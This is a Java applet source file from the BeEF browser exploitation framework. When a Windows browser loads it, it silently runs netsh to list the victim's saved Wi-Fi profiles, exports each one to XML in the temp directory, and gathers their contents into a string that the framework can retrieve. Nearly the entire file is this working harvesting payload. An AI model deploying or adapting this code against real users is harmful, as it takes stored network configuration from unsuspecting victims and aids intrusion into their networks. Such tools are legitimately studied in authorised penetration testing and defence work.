/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

import java.io.*;  
import java.util.*;
import java.net.*;
import java.applet.*;

// Keith Lee
// Twitter: @keith55
// http://milo2012.wordpress.com
// keith.lee2012[at]gmail.com

public class wirelessZeroConfig extends Applet{  
	public static String result = "";
		
	public wirelessZeroConfig(){
		super();
		return;
	}
	public static String getInfo() {
		return result;
	}

	public void init() {
		if (isWindows()) {
			String osVersion= System.getProperty("os.version");
			if(osVersion.equals("6.0") || osVersion.equals("6.1")){
				result=getWindows();
			}
		} else {
			result = "OS is not supported";
		}
	}
	
	public static String getWindows(){
		String cmd1 = "netsh wlan show profiles";
		String cmd2 = "netsh wlan export profile name=";
		String keyword1 = "User profiles";
	 	String wlanProfileArr[];
		String wlanProfileName;
		int match = 0;
		int count = 0;
		ArrayList<String> profileList = new ArrayList<String>();
		try {  
			//Get wlan profile names
			Process p1 = Runtime.getRuntime().exec(cmd1);  
			BufferedReader in1 = new BufferedReader(new InputStreamReader(p1.getInputStream()));  
			String line = null;  
        		//Checks if string match "User profiles"
			while ((line = in1.readLine()) != null) {
				//Checks if string match "User profiles"
				if(match==0){
					if(line.toLowerCase().contains(keyword1.toLowerCase())){
						match=1;
					}
				}	
				if(match==1){
					if(count>1){
						//If string matches the keyword "User Profiles"
						line = (line.replaceAll("\\s+$","").replaceAll("^\\s+", ""));
						if(line.length()>0){
							wlanProfileName = (line.split(":")[1]).replaceAll("\\s+$","").replaceAll("^\\s+", "");;
							profileList.add(wlanProfileName);
						}
					}
					count+=1;
				}
			}
			in1.close();	
	    	} catch (IOException e) { }
		
		try{	
    			String tmpDir = System.getProperty("java.io.tmpdir");
			if ( !(tmpDir.endsWith("/") || tmpDir.endsWith("\\")) )
   				tmpDir = tmpDir + System.getProperty("file.separator");

			//Export WLAN Profile to XML file
			for(Iterator iterator = profileList.iterator(); iterator.hasNext();){
				String profileName = iterator.next().toString();
				Process p2 = Runtime.getRuntime().exec(cmd2+'"'+profileName+'"');  
				//Check if exported xml exists
				File f = new File(tmpDir+"Wireless Network Connection-"+profileName+".xml");
				if(f.exists()){	
					//Read contents of XML file into results variable
					FileInputStream fstream = new FileInputStream(f);
					DataInputStream in2 = new DataInputStream(fstream);
					BufferedReader br = new BufferedReader(new InputStreamReader(in2));
					String xmlToStr;
					while((xmlToStr = br.readLine()) != null){			
						result+=xmlToStr;
					}
					in2.close();				
				}
			}
	    } catch (IOException e) {  
        }
		return result;   
	}

	public static boolean isWindows() {
		String os = System.getProperty("os.name").toLowerCase();
		return (os.indexOf("win") >= 0);
	}
	
	/**
	public static void main(String[] args) {
		if (isWindows()) {
			String osVersion= System.getProperty("os.version");
			System.out.println(osVersion);
			if(osVersion.equals("6.0") || osVersion.equals("6.1")){
				result=getWindows();
			}
		} else {
			result = "OS is not supported";
		}
		System.out.println(result);
	}
	**/
}  
